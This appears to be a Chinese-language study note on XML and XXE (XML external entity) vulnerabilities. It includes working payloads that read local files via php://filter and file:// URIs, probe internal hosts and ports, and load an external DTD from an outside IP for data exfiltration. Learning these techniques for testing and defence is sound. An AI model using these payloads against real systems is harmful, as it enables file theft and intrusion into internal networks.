### 一、xml簡介
一种存储和传输数据的标签语言。xml不适用预定义的标签，因此可以为标记指定描述数据的名称
文档结构：
	xml文档声明，在文档第一行
	xml文档类型定义
	xml文档元素
dtd文档类型定义：（漏洞产生在文档类型定义处，外部声明dtd处）
	![[Pasted image 20231221090308.png]]

#### xxe漏洞基础：
 ![[Pasted image 20231221090530.png]]
### xxe漏洞利用：
有回显利用：
	读取文件：
```xml
<?xml version= "1.0" encoding= "utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY aaa SYSTEM "php://filter/convert.base64-encode/resource=xxe_1.php" >]>
<name>&aaa;</name>



<!ENTITY aaa SYSTEM "php://filter/convert.base64-encode/resource=xxe_1.php" >]>
<!ENTITY aaa SYSTEM "file:///C:/Windows/win.ini" >]>
```
	![[Pasted image 20231221091455.png]]
	内网探测：
	bp爆破ip的d字段可以探测内网可用主机，bp爆破端口可以探测内网主机开启的端口
```xml
<?xml version= "1.0" encoding= "utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]>
<name>&xxe;</name>
```
	![[Pasted image 20231221091721.png]]

 引入外部实体dtd：
```XML
<!---->
<?xml version= "1.0"?>
<!DOCTYPE test[
<!ENTITY % dtd SYSTEM "http://192.168.43.117/eval.dtd">
%dtd;
]>
<name>&send;</name>
```
	![[Pasted image 20231221092209.png]]
	![[Pasted image 20231221092252.png]]


